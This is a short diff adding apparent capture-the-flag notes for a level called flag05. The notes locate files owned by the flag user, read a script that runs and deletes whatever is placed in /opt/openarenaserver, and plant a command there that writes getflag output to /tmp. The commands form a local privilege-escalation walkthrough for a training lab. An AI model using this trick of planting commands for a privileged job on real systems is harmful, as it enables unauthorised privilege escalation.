@@ -1,0 +1,10 @@
+find / -user flag05 2>/dev/null
+find usr/sbin/openarenaserver
+cat it
+script will launch all bash command in /opt/openarenaserver
+and delete it
+create a file with echo "getflag > /tmp/flag" > file
+wait that it disappear
+go to /tmp and cat flag
+
+echo "getflag > /tmp/flag" > /opt/openarenaserver/dostuff
